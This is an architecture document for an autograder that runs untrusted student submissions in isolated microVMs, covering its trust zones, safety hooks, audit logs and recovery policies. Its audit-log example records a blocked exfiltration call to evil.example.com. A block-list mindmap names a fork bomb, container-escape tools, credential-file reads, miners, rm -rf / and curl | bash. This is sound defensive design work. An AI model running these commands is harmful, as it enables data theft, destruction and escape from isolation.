# 🏗️ Architecture — Celesto Agent Guard

> Deep-dive system architecture for the Hostile Submission Autograder.
> Every component, every boundary, every trust decision documented.

---

## Table of Contents

1. [Architectural Philosophy](#1-architectural-philosophy)
2. [System Overview](#2-system-overview)
3. [Two-Zone Trust Model](#3-two-zone-trust-model)
4. [Component Architecture](#4-component-architecture)
5. [Data Architecture](#5-data-architecture)
6. [Sandbox Isolation Architecture](#6-sandbox-isolation-architecture)
7. [Safety Hook Architecture](#7-safety-hook-architecture)
8. [API Layer Architecture](#8-api-layer-architecture)
9. [Failure & Recovery Architecture](#9-failure--recovery-architecture)
10. [Concurrency Architecture](#10-concurrency-architecture)
11. [Security Architecture](#11-security-architecture)
12. [Deployment Architecture](#12-deployment-architecture)
13. [Scaling Architecture](#13-scaling-architecture)

---

## 1. Architectural Philosophy

The design is guided by four principles:

```
┌─────────────────────────────────────────────────────────────────┐
│                    Architectural Principles                      │
│                                                                 │
│  1. ZERO HOST EXECUTION                                         │
│     No student code ever runs on the host. Period.             │
│     Tools call Celesto SDK. Celesto calls Firecracker.         │
│                                                                 │
│  2. EVERY SANDBOX IS EPHEMERAL                                 │
│     Created fresh, deleted after use. No shared state.         │
│     Failed sandboxes are cleaned up in finally blocks.         │
│                                                                 │
│  3. AUDIT EVERYTHING                                            │
│     Every command attempt — including blocked ones — is         │
│     logged to commands.jsonl before the sandbox sees it.       │
│                                                                 │
│  4. FAIL SAFE, NOT FAIL OPEN                                   │
│     If a step fails, the sandbox is deleted (not left          │
│     running). Recovery policy is explicit, not implicit.       │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. System Overview

```mermaid
graph TB
    subgraph INTERNET ["🌍 Public Internet"]
        CLIENT["👤 HTTP Client\n(Instructor / CI)"]
    end

    subgraph COMPOSE ["🐳 Docker Compose Network (bridge)"]
        subgraph API_SVC ["api service (port 8080)"]
            FASTAPI["FastAPI\napp/main.py"]
            PYDANTIC["Pydantic\nValidation"]
            ORM["SQLAlchemy\nORM"]
            FASTAPI --> PYDANTIC
            FASTAPI --> ORM
        end

        subgraph DB_SVC ["ledger service (port 5432)"]
            PG["PostgreSQL 15\nruns table"]
            SEEDS["seeds/01_runs.sql\n(auto-loaded)"]
            SEEDS -->|"first boot"| PG
        end

        ORM <-->|"pg:// TCP"| PG
    end

    subgraph AGENT_PROC ["🤖 Agent Process (Python)"]
        EVAL["eval_runner.py\nOrchestrator"]
        AG["autograder.py\n10-step pipeline"]
        HOOKS["safety_hooks.py\nPre/post command"]
        SBX_WRAP["sandbox_tools.py\nCelestoSandbox wrapper"]
        EVAL --> AG
        AG --> HOOKS
        AG --> SBX_WRAP
        HOOKS --> SBX_WRAP
    end

    subgraph CELESTO_ZONE ["🔒 Celesto Execution Zone"]
        SDK["Celesto SDK\n(Python)"]
        subgraph GUESTS ["Guest VMs (Firecracker microVMs)"]
            VM1["📦 sbx-abc123\nnetwork=OFF\nstudent code"]
            VM2["📦 sbx-def456\nnetwork=OFF\nstudent code"]
            VM3["📦 sbx-ghi789\nnetwork=OFF\nstudent code"]
        end
        SDK --> VM1
        SDK --> VM2
        SDK --> VM3
    end

    subgraph LOGS ["📊 Audit & Reports"]
        CMDLOG["logs/commands.jsonl"]
        REPORTS["reports/*.json\n*.jsonl\npostmortem.md"]
    end

    CLIENT <-->|"HTTPS"| FASTAPI
    EVAL -->|"HTTP POST"| FASTAPI
    SBX_WRAP --> SDK
    HOOKS -->|"append"| CMDLOG
    EVAL -->|"write"| REPORTS

    style INTERNET fill:#E3F2FD,stroke:#1565C0
    style COMPOSE fill:#E8F5E9,stroke:#2E7D32
    style AGENT_PROC fill:#FFF8E1,stroke:#F57F17
    style CELESTO_ZONE fill:#FCE4EC,stroke:#880E4F
    style LOGS fill:#F3E5F5,stroke:#6A1B9A
```

---

## 3. Two-Zone Trust Model

This is the fundamental security boundary of the system:

```mermaid
graph LR
    subgraph TRUSTED ["🟢 TRUSTED ZONE — Your Code Runs Here"]
        direction TB
        T1["FastAPI process\n(validated input only)"]
        T2["PostgreSQL\n(ACID run ledger)"]
        T3["Agent loop\n(orchestrates steps)"]
        T4["Safety hooks\n(pre-command filters)"]
        T5["Audit log\n(append-only)"]
        T6["Celesto SDK\n(trusted client)"]
        T1 --- T2
        T3 --- T4
        T4 --- T5
        T3 --- T6
    end

    BOUNDARY["━━━━━━━━━━━━━━━━━━━━━━━━━━\n   TRUST BOUNDARY\n   (Celesto microVM)\n━━━━━━━━━━━━━━━━━━━━━━━━━━"]

    subgraph UNTRUSTED ["🔴 UNTRUSTED ZONE — Student Code Runs Here"]
        direction TB
        U1["Firecracker VM\n(separate kernel)"]
        U2["submission.py\n(UNTRUSTED)"]
        U3["No network\n(virtio-net not wired)"]
        U4["No host mounts\n(read-only or none)"]
        U1 --- U2
        U1 --- U3
        U1 --- U4
    end

    T6 -->|"SDK commands\n(create, exec, delete)"| BOUNDARY
    BOUNDARY --> U1
    U2 -.->|"Cannot reach"| HOST(["🏠 Host Filesystem\nSecrets\nOther students"])
    U2 -.->|"Cannot reach"| NET(["🌍 Internet"])

    style TRUSTED fill:#E8F5E9,stroke:#1B5E20,color:#1B5E20
    style UNTRUSTED fill:#FFEBEE,stroke:#B71C1C,color:#B71C1C
    style BOUNDARY fill:#424242,color:#fff
    style HOST fill:#B71C1C,color:#fff
    style NET fill:#B71C1C,color:#fff
```

### What Cannot Cross the Boundary

| From → To | Allowed | Mechanism |
|---|---|---|
| Trusted → Guest | ✅ SDK commands, file writes | Celesto SDK (vsock/SSH) |
| Guest → Internet | ❌ | Firecracker virtio-net disconnected |
| Guest → Host filesystem | ❌ | No host mounts configured |
| Guest → Other guests | ❌ | Separate VM, no shared network |
| Guest → Host env vars | ❌ | Env not injected into guest |
| Blocked command → Guest | ❌ | Safety hook raises before SDK call |

---

## 4. Component Architecture

### 4.1 API Layer (`app/`)

```mermaid
classDiagram
    class FastAPIApp {
        +GET /health() dict
        +GET /api/runs() List~RunResponse~
        +POST /api/runs(RunCreate) RunResponse
        -validation_exception_handler()
    }

    class RunCreate {
        +str run_id
        +str sandbox_name
        +str problem_id
        +str state
        +str execution_target
        +validate_sandbox_name() str
        +validate_state() str
        +validate_execution_target() str
    }

    class Run {
        +int id
        +str run_id
        +str sandbox_name
        +str problem_id
        +str state
        +str execution_target
        +datetime created_at
        +datetime updated_at
    }

    class Database {
        +create_engine()
        +SessionLocal()
        +get_db() Generator
    }

    FastAPIApp --> RunCreate : validates
    FastAPIApp --> Run : persists
    FastAPIApp --> Database : uses session
    Run --> Database : mapped to
```

### 4.2 Agent Layer (`agent/`)

```mermaid
classDiagram
    class Autograder {
        +str submission_type
        +bool force_step7_fail
        +str network_policy
        +grade(sandbox_name) dict
        -_step_validate()
        -_step_boot_probe()
        -_step_write_files()
        -_step_install_deps()
        -_step_static_analysis()
        -_step_run_tests()
        -_step_coverage()
        -_step_memory_profile()
        -_step_generate_report()
        -_apply_recovery_policy()
    }

    class CelestoSandbox {
        +str name
        +str network_policy
        +str problem_id
        +float boot_to_ready_s
        +__enter__() CelestoSandbox
        +__exit__() None
        +run(command) SandboxResult
        +write_file(path, content) None
        +read_file(path) str
        -_cleanup() None
        -_unique_name() str$
    }

    class SandboxResult {
        +int exit_code
        +str stdout
        +str stderr
        +bool ok
    }

    class SafetyHooks {
        +pre_command_hook(sandbox, cmd, policy) dict
        +post_command_hook(sandbox, cmd, exit_code, stdout) None
        +BLOCKED_PATTERNS List~Pattern~
        +SUSPICIOUS_PATTERNS List~Pattern~
    }

    class CommandBlockedError {
        <<exception>>
        +str message
    }

    class StepFailure {
        <<exception>>
        +int step
        +str reason
    }

    Autograder --> CelestoSandbox : creates via context manager
    Autograder --> StepFailure : raises on step fail
    CelestoSandbox --> SandboxResult : returns from run()
    CelestoSandbox --> SafetyHooks : calls pre/post hook
    SafetyHooks --> CommandBlockedError : raises to block
```

### 4.3 Eval Runner (`agent/eval_runner.py`)

```mermaid
flowchart LR
    MAIN["__main__\nentry point"] --> R1
    MAIN --> R2
    MAIN --> R3
    MAIN --> R4

    R1["run_reliability_eval(20)\n20 fresh sandbox runs\nCompute median/p90/cost"] --> REL["reports/reliability.json"]
    R2["run_containment_test()\nFeed exfil submission\nVerify block"] --> CONT["reports/containment.json\nreports/evidence/containment.log"]
    R3["run_failure_policy_demo()\nForce step 7 fail\nApply fresh policy"] --> FP["reports/failure_policy.json\nreports/failure_trace.jsonl"]
    R4["run_concurrency_demo()\n5 threads × 1 sandbox each\nRecord breakage notes"] --> CONC["reports/concurrency.json"]

    style MAIN fill:#6C63FF,color:#fff
    style REL fill:#2E7D32,color:#fff
    style CONT fill:#1565C0,color:#fff
    style FP fill:#E65100,color:#fff
    style CONC fill:#4A148C,color:#fff
```

---

## 5. Data Architecture

### Database Schema

```mermaid
erDiagram
    RUNS {
        serial id PK
        varchar run_id UK "UNIQUE NOT NULL"
        varchar sandbox_name "NOT NULL — matches sbx-[a-z0-9]{8,}"
        varchar problem_id "NOT NULL"
        varchar state "CHECK IN created|ready|running|succeeded|failed|deleted"
        varchar execution_target "CHECK = celesto_sandbox"
        timestamptz created_at "DEFAULT NOW()"
        timestamptz updated_at "DEFAULT NOW()"
    }
```

### Sandbox Name Convention

```
sbx-[a-z0-9]{8,}
 │      │
 │      └── 8+ lowercase hex chars from uuid4().hex[:12]
 └────────── mandatory prefix
 
Examples:
  sbx-8faf96af61b5   ✅
  sbx-seeddemo1      ✅ (seed row, manually named)
  sbx-abc            ❌ (too short)
  sbx-ABC123         ❌ (uppercase)
  sandbox-123        ❌ (wrong prefix)
```

### Audit Log Schema (`logs/commands.jsonl`)

```json
{
  "ts": "2026-11-05T11:30:01.234567+00:00",
  "sandbox_name": "sbx-8faf96af61b5",
  "command": "echo sandbox_ready",
  "decision": "allow",
  "execution_target": "celesto_sandbox"
}
```

```json
{
  "ts": "2026-11-05T11:30:03.891234+00:00",
  "sandbox_name": "sbx-c60802be8403",
  "command": "urllib.request.urlopen('http://evil.example.com...')",
  "decision": "block",
  "execution_target": "celesto_sandbox"
}
```

### Failure Trace Schema (`reports/failure_trace.jsonl`)

```json
{"ts": "...", "event": "step_failed",    "step": 7, "sandbox_name": "sbx-...", "reason": "coverage.py not available"}
{"ts": "...", "event": "policy_applied", "policy": "fresh", "sandbox_name": "sbx-...", "action": "Deleted and created fresh"}
```

---

## 6. Sandbox Isolation Architecture

### Isolation Stack

```
┌────────────────────────────────────────────────────────┐
│                    Host Machine                         │
│                                                        │
│  ┌──────────────────────────────────────────────────┐  │
│  │               Celesto Agent Guard                │  │
│  │  (Python process, Docker containers)             │  │
│  │                                                  │  │
│  │  ┌──────────────────────────────────────────┐   │  │
│  │  │          Celesto SDK                     │   │  │
│  │  │  (trusted, runs in host Python process)  │   │  │
│  │  └────────────────────┬─────────────────────┘   │  │
│  │                       │ KVM / vsock              │  │
│  └───────────────────────┼──────────────────────────┘  │
│                          │                              │
│  ┌───────────────────────▼──────────────────────────┐  │
│  │         Firecracker VMM (microVM)                │  │
│  │                                                  │  │
│  │  ┌────────────────────────────────────────────┐  │  │
│  │  │          Guest Linux Kernel                │  │  │
│  │  │                                            │  │  │
│  │  │  ┌──────────────────────────────────────┐  │  │  │
│  │  │  │       Student Code                   │  │  │  │
│  │  │  │  submission.py (UNTRUSTED)            │  │  │  │
│  │  │  │                                      │  │  │  │
│  │  │  │  ❌ No network (virtio-net=OFF)       │  │  │  │
│  │  │  │  ❌ No host mounts                   │  │  │  │
│  │  │  │  ❌ No host env vars                 │  │  │  │
│  │  │  └──────────────────────────────────────┘  │  │  │
│  │  └────────────────────────────────────────────┘  │  │
│  └──────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────┘
```

### Isolation vs. Alternatives

```mermaid
graph TD
    subgraph SPECTRUM ["Isolation Spectrum"]
        S1["subprocess.run()\n❌ Zero isolation\nHost kernel, host FS, host net\nOne rm -rf = data loss"]
        S2["Docker container\n⚠️ Shared host kernel\nContainer escape via kernel exploit\nFast but weaker"]
        S3["gVisor\n✅ User-space kernel\nStrong isolation\nSlower than Docker"]
        S4["Celesto / Firecracker\n✅✅ Separate kernel (KVM)\n~500ms boot\nHardware-level isolation"]
        S5["Full VM (VirtualBox)\n✅✅ Separate kernel\nTens of seconds boot\nHeavy overhead"]
    end

    S1 -->|"More isolated"| S2
    S2 -->|"More isolated"| S3
    S3 -->|"More isolated"| S4
    S4 -->|"More isolated"| S5

    style S1 fill:#D32F2F,color:#fff
    style S2 fill:#FF8F00,color:#fff
    style S3 fill:#1976D2,color:#fff
    style S4 fill:#2E7D32,color:#fff
    style S5 fill:#2E7D32,color:#fff
```

---

## 7. Safety Hook Architecture

### Hook Execution Model

```mermaid
sequenceDiagram
    participant AG as 🤖 Agent
    participant H as 🛡️ Safety Hook
    participant L as 📋 Audit Log
    participant SDK as 🔧 Celesto SDK
    participant VM as 📦 Guest VM

    AG->>H: pre_command_hook(sandbox_name, command, network_policy)

    H->>H: Check BLOCKED_PATTERNS (regex list)
    H->>H: Check SUSPICIOUS_PATTERNS (log warning)
    H->>H: Check network_policy + outbound tools

    alt Decision = BLOCK
        H->>L: append {decision: "block", ...}
        H-->>AG: raise CommandBlockedError(reason)
        Note over AG: Command never reaches SDK or VM
    else Decision = ALLOW
        H->>L: append {decision: "allow", ...}
        H-->>AG: return {decision: "allow"}
        AG->>SDK: computer.run(command)
        SDK->>VM: execute in guest
        VM-->>SDK: {exit_code, stdout, stderr}
        SDK-->>AG: SandboxResult
        AG->>H: post_command_hook(result)
    end
```

### Blocked Pattern Categories

```mermaid
mindmap
  root((Safety Hook\nBlocked Patterns))
    Fork Bombs
      :"(){ :|:& };"
      :fork bomb keyword
    Container Escape
      :nsenter
      :unshare --pid
    Credential Access
      :/etc/shadow
      :/proc/PID/environ
    Crypto Miners
      :xmrig
      :minergate
      :nicehash
    Network Exfil
      :curl -d $VAR (network=off)
      :wget --post-data
      :urllib.request (network=off)
    Suspicious (Warn Only)
      :rm -rf /
      :dd if=/dev/zero
      :curl | bash
      :wget | sh
```

---

## 8. API Layer Architecture

### Request Validation Pipeline

```mermaid
flowchart LR
    REQ["HTTP Request\nPOST /api/runs"] --> PYDANTIC

    subgraph PYDANTIC ["Pydantic Validation Layer"]
        V1["validate_sandbox_name()\nRegex: ^sbx-[a-z0-9]{8,}$"]
        V2["validate_state()\nMust be in VALID_STATES set"]
        V3["validate_execution_target()\nMust be 'celesto_sandbox'"]
    end

    PYDANTIC -->|"All pass"| ORM["SQLAlchemy\nINSERT to Postgres"]
    PYDANTIC -->|"Any fail"| ERR["400 Bad Request\n{detail: error message}"]
    ORM --> RESP["201 Created\n{run object}"]

    style ERR fill:#D32F2F,color:#fff
    style RESP fill:#2E7D32,color:#fff
```

### Healthcheck Chain

```mermaid
graph LR
    DC["docker-compose\nhealthcheck loop"] -->|"every 10s"| API_HC
    API_HC["api healthcheck:\npython -c urllib.request\n/health"] -->|"200"| HEALTHY["✅ api HEALTHY"]
    API_HC -->|"fail"| UNHEALTHY["❌ api UNHEALTHY"]

    DC2["docker-compose\nhealthcheck loop"] -->|"every 5s"| PG_HC
    PG_HC["ledger healthcheck:\npg_isready -U ledger"] -->|"pass"| HEALTHY2["✅ ledger HEALTHY"]
    PG_HC -->|"fail"| UNHEALTHY2["❌ ledger UNHEALTHY"]

    API_BOOT["api service"] -->|"depends_on\ncondition: service_healthy"| HEALTHY2

    style HEALTHY fill:#2E7D32,color:#fff
    style HEALTHY2 fill:#2E7D32,color:#fff
    style UNHEALTHY fill:#D32F2F,color:#fff
    style UNHEALTHY2 fill:#D32F2F,color:#fff
```

---

## 9. Failure & Recovery Architecture

### State Machine (Complete)

```mermaid
stateDiagram-v2
    [*] --> Created : SDK creates guest\n(unique sbx-name)

    Created --> Ready : boot probe passes\n(echo sandbox_ready)
    Created --> Deleted : boot probe fails\n(cleanup in finally)

    Ready --> Running : agent begins\nstep 1

    Running --> Succeeded : all 10 steps OK\ngrade report written
    Running --> MidTaskFailure : StepFailure raised\n(any step, designed: step 7)
    Running --> Deleted : Ctrl-C / SIGTERM\n(signal handler)

    MidTaskFailure --> Resumed : policy = resume\n(keep same disk)
    MidTaskFailure --> RolledBack : policy = rollback\n(restore snapshot)
    MidTaskFailure --> FreshStart : policy = fresh ✅\n(delete + new sandbox)

    Succeeded --> Deleted : context manager __exit__\ncleanup_on_success = true
    Resumed --> Running : retry steps
    RolledBack --> Running : retry from clean state
    FreshStart --> Created : new sandbox\nnew unique name

    Deleted --> [*]

    note right of MidTaskFailure
        Policy is applied here.
        This project uses "fresh".
        Trace written to
        failure_trace.jsonl
    end note
```

### Recovery Policy Decision Tree

```mermaid
flowchart TD
    FAIL["StepFailure raised\nat step N"] --> Q1

    Q1{"Job duration\n> 10 minutes?"}
    Q1 -->|"YES"| Q2
    Q1 -->|"NO"| FRESH

    Q2{"Pre-step snapshot\nexists?"}
    Q2 -->|"YES"| ROLLBACK
    Q2 -->|"NO"| Q3

    Q3{"Failed step\nidempotent?"}
    Q3 -->|"YES"| RESUME
    Q3 -->|"NO"| FRESH

    FRESH["🆕 FRESH\nDelete sandbox\nCreate new\nRetry all steps\n✅ This project"]
    ROLLBACK["⏮️ ROLLBACK\nRestore snapshot\nRetry from checkpoint\n(saves re-running steps 1-N-1)"]
    RESUME["▶️ RESUME\nKeep same disk\nRetry from step N\n(cheapest, risk of dirty state)"]

    style FRESH fill:#2E7D32,color:#fff
    style ROLLBACK fill:#1565C0,color:#fff
    style RESUME fill:#E65100,color:#fff
```

---

## 10. Concurrency Architecture

### Multi-Job Execution Model

```mermaid
graph TD
    RUNNER["eval_runner\nrun_concurrency_demo()"] --> T1
    RUNNER --> T2
    RUNNER --> T3
    RUNNER --> T4
    RUNNER --> T5

    T1["Thread 1\nsbx-3a0aa1160a89\nAutograder.grade()"]
    T2["Thread 2\nsbx-848258cf30df\nAutograder.grade()"]
    T3["Thread 3\nsbx-92a41f2758e3\nAutograder.grade()"]
    T4["Thread 4\nsbx-fd87cdcbf15b\nAutograder.grade()"]
    T5["Thread 5\nsbx-77e4a41b2910\nAutograder.grade()"]

    T1 --> SBX1["📦 Sandbox 1\n(independent VM)"]
    T2 --> SBX2["📦 Sandbox 2\n(independent VM)"]
    T3 --> SBX3["📦 Sandbox 3\n(independent VM)"]
    T4 --> SBX4["📦 Sandbox 4\n(independent VM)"]
    T5 --> SBX5["📦 Sandbox 5\n(independent VM)"]

    SBX1 --> DEL1["🗑️ Deleted"]
    SBX2 --> DEL2["🗑️ Deleted"]
    SBX3 --> DEL3["🗑️ Deleted"]
    SBX4 --> DEL4["🗑️ Deleted"]
    SBX5 --> DEL5["🗑️ Deleted"]

    LOG["📋 Thread-safe\ncommands.jsonl\n(file append)"]
    T1 & T2 & T3 & T4 & T5 -.->|"lock=threading.Lock()"| LOG

    style RUNNER fill:#6C63FF,color:#fff
```

### Concurrency Limits

| Environment | Concurrent Sandboxes | Notes |
|---|---|---|
| Celesto Cloud (free trial) | 1 retained | Rate limit on 2nd+ create |
| Celesto Cloud (paid) | Up to 10 | Paid top-up required |
| Local runtime (Linux KVM) | Unlimited | Only CPU/RAM limited |
| Local simulation (this code) | Unlimited | No real VMs |

---

## 11. Security Architecture

### Defense in Depth

```mermaid
graph TD
    ATTACK["🔴 Malicious Student Submission"] --> L1

    L1{"Layer 1:\nStatic Analysis\n(step 5)"}
    L1 -->|"Pattern found"| WARN1["⚠️ Flag dangerous patterns\nLog warning\nMark in grade report"]
    L1 --> L2

    WARN1 --> L2

    L2{"Layer 2:\nSafety Hook\n(pre_command_hook)"}
    L2 -->|"Blocked pattern"| BLOCK1["❌ CommandBlockedError\nNever reaches SDK"]
    L2 -->|"Allowed"| L3

    L3{"Layer 3:\nNetwork Policy\n(virtio-net=OFF)"}
    L3 -->|"Outbound blocked"| BLOCK2["❌ Network unreachable\nHypervisor level"]
    L3 -->|"Local only"| L4

    L4{"Layer 4:\nVM Isolation\n(Firecracker KVM)"}
    L4 -->|"Escape attempt"| BLOCK3["❌ Separate kernel\nHost untouched"]
    L4 -->|"Normal exit"| SAFE["✅ Sandbox deleted\nHost clean"]

    style ATTACK fill:#D32F2F,color:#fff
    style BLOCK1 fill:#1565C0,color:#fff
    style BLOCK2 fill:#1565C0,color:#fff
    style BLOCK3 fill:#1565C0,color:#fff
    style SAFE fill:#2E7D32,color:#fff
```

### Credential Safety Rules

```
✅ DO:
  - Use CELESTO_PROVIDER=local_sim for testing (no real key needed)
  - Use scoped, short-lived API keys for cloud runs
  - Store secrets in .env (gitignored), never in code
  - Never inject real API keys into sandbox env vars

❌ DON'T:
  - Inject $CELESTO_API_KEY into guest environment
  - Use a writable host-mount that includes ~/.config or .env
  - Commit .env to git (checked by test_no_live_env_file)
  - Reuse sandbox names (UUID-based names prevent this)
```

---

## 12. Deployment Architecture

### Docker Compose Network

```mermaid
graph LR
    subgraph HOST ["Host Machine"]
        subgraph BRIDGE ["Docker bridge network: gpp42_default"]
            API["api\n:8080 (internal)\nBuilt from Dockerfile"]
            PG["ledger\n:5432 (internal)\npostgres:15-alpine"]
            API -->|"postgresql://\nledger:ledger@ledger:5432/ledger"| PG
        end
        PORT["Host port :8080\nexposed to host"]
        PORT -->|"maps to"| API
    end

    CLIENT["External\nHTTP Client"] -->|":8080"| PORT

    SEEDS["./seeds/\n01_runs.sql"] -->|"volume mount\n/docker-entrypoint-initdb.d"| PG
    LEDGER_VOL["ledger_data\n(named volume)"] -->|"persists"| PG

    style HOST fill:#E3F2FD,stroke:#1565C0
    style BRIDGE fill:#E8F5E9,stroke:#2E7D32
```

### Dockerfile Build Process

```mermaid
graph TD
    BASE["FROM python:3.11-slim"] --> WORKDIR
    WORKDIR["WORKDIR /app"] --> COPY_REQ
    COPY_REQ["COPY app/requirements.txt ."] --> PIP
    PIP["RUN pip install -r requirements.txt\n(no-cache for smaller image)"] --> COPY_APP
    COPY_APP["COPY app/ ./app/\nCOPY seeds/ ./seeds/"] --> EXPOSE
    EXPOSE["EXPOSE 8080"] --> CMD
    CMD["CMD uvicorn app.main:app\n--host 0.0.0.0 --port 8080"]

    style BASE fill:#1565C0,color:#fff
    style CMD fill:#2E7D32,color:#fff
```

---

## 13. Scaling Architecture

### From 20 Runs to 1,000+

```mermaid
graph TB
    subgraph NOW ["Current (Simulation / Single Cloud)"]
        S1["20 sequential runs\n~0.21s each\n1 sandbox at a time"]
    end

    subgraph NEXT ["Next: Paid Cloud + Thread Pool"]
        S2["20 concurrent runs\nThread pool executor\n10 sandboxes × 2 batches"]
    end

    subgraph SCALE ["Scale: Queue + Worker Fleet"]
        S3["Queue (Redis/SQS)"] --> W1["Worker 1\nCelesto Sandbox"]
        S3 --> W2["Worker 2\nCelesto Sandbox"]
        S3 --> W3["Worker 3\nCelesto Sandbox"]
        S3 --> WN["Worker N\n..."]
        W1 & W2 & W3 & WN --> DB2["Postgres\nRun Ledger"]
    end

    subgraph BOTTLENECKS ["Known Bottlenecks"]
        B1["Free trial: 1 sandbox\n→ Upgrade or use local runtime"]
        B2["Postgres writes:\nrow per run\n→ Connection pool"]
        B3["commands.jsonl:\nfile append lock\n→ Replace with Postgres table"]
        B4["Safety hooks:\nRegex per command\n→ Compile once at startup ✅"]
    end

    NOW -->|"+ thread pool\n+ paid plan"| NEXT
    NEXT -->|"+ queue\n+ auto-scale workers"| SCALE

    style SCALE fill:#E8F5E9,stroke:#2E7D32
    style BOTTLENECKS fill:#FFF8E1,stroke:#F57F17
```

---

*Architecture document last updated: November 2026*
*For implementation details, see [projectdocumentation.md](projectdocumentation.md)*
